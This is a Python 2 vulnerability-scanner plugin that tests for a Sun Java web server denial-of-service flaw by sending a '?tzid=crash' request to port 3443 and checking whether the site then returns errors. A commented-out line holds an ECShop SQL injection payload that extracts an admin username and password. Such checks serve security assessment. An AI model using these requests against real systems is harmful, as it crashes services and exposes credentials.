#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list=[]
    try:
        
        domain = ob['domain']
        detail=u"" 
        detail = detail.encode('utf8')
#-------START mofify by yinkun 2014-10-14  增加对IPv6地址的处理-----------------------------
        if domain.find("]") >= 0 and domain.find("[") >= 0:
            a = domain.find("]")
            domain = domain[:a+1]
        elif domain.find(":")>=0:
            domain=domain.split(":")[0]
        domain=domain+":3443"
#-------END------------------------------------------------------------
        checkg="?tzid=crash"
        url = "https://%s%s%s" % (domain,ob['base_path'],checkg)
        # url += "/user.php?act=is_registered&username=%ce%27%20and%201=1%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20concat%280x5b,user_name,0x3a,password,0x5d%29%20FROM%20ecs_admin_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23"
        resinit, contentinit = requestUrl(http,"http://"+ob['domain']+ob['base_path'],ob['task_id'],ob['domain_id'])
        try:
            
            res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        except Exception,e:
            logging.getLogger().debug("first DDOS")
        try:
            
            res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        except Exception,e:
            logging.getLogger().debug("second DDOS")
        
        resend, contentend = requestUrl(http,"http://"+ob['domain'],ob['task_id'],ob['domain_id'])
        if resinit['status']=='200' and resend['status']=='500':
#            url1=url = "https://%s%s" % (domain,checkg)
#            request = getRequest(url1)
#            response = getResponse(res)
            list.append(getRecord(ob,"http://"+ob['domain'],ob['level'],detail,"",""))
    except Exception,e:
        logging.getLogger().error("File:SUNJAVADDOSscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:SUNJAVADDOSscript.py, run_domain function :" + str(e))
    #end try
    return list
